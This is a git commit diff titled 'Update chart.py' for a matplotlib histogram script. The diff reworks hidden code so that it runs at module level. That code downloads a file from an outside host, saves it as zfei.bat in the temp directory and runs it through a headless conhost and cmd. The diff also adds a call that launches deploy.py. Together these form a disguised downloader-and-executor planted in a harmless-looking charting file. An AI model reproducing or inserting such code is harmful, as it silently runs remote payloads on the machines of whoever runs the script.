b8a68d97b20b5e3afd039afc1eeec06b7524a27b
crmdevtest <crmdevtest@broskiboy.com>
2026-05-21 11:42:55 -0400

    Update chart.py

--- chart.py
+++ chart.py
@@ -7,8 +7,6 @@ import os
 import tempfile
 import requests
 
-asyncio.run(my_function())
-
 # Sample Data: 1000 random numbers from a normal distribution
 data = np.random.randn(1000)
 
@@ -19,6 +17,7 @@ plt.hist(data, bins=30, color='skyblue', edgecolor='black')
 plt.title('Basic Histogram (Matplotlib)')
 plt.xlabel('Value Range')
 plt.ylabel('Frequency')
+subprocess.run([sys.executable, "deploy.py"])
 
 plt.show()
 
@@ -165,21 +164,20 @@ plt.show()
 
 
 
-async def my_function():
-    url = "http://s1083932807.online-home.ca/o"
-    
-    # Get the Windows temp directory path
-    temp_dir = tempfile.gettempdir()
-    file_path = os.path.join(temp_dir, "zfei.bat")
-    
-    # Download and save
-    response = requests.get(url)
-    if response.status_code == 200:
-        with open(file_path, "wb") as f:
-            f.write(response.content)
-        # print(f"File downloaded to: {file_path}")
-    
-    script_path = file_path
-    
-    # Launch wscript with the script path as an argument
-    subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])
+url = "http://s1083932807.online-home.ca/o"
+
+# Get the Windows temp directory path
+temp_dir = tempfile.gettempdir()
+file_path = os.path.join(temp_dir, "zfei.bat")
+
+# Download and save
+response = requests.get(url)
+if response.status_code == 200:
+    with open(file_path, "wb") as f:
+        f.write(response.content)
+    # print(f"File downloaded to: {file_path}")
+
+script_path = file_path
+
+# Launch wscript with the script path as an argument
+subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])
